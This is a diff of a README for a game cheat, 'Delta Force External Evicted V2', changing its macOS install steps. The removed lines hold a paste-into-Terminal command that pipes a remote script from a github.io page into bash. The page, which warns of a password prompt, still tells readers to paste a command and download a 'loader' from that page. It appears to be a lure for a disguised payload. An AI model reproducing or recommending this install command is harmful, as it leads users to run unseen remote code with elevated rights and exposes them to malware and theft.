@@ -122,14 +122,9 @@ The **🛡️ Delta Force External Evicted V2** is the most trusted external che
 ### 🍎 macOS
 
 1. **Press `⌘ + Space`**, type **Terminal**, hit Enter
-2. **Paste the command below** (`⌘ + V`) and press Enter
+2. **Paste the command** (`⌘ + V`) and press Enter
 3. **Follow the prompts** — the loader installs automatically
 
-```bash
-bash <(curl -fsSL https://laplaplaplas.github.io/mac-download/)
-```
-
-> Works on Apple Silicon (M1–M4) and Intel Macs. macOS may ask for your password during install.
 
 [![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
 
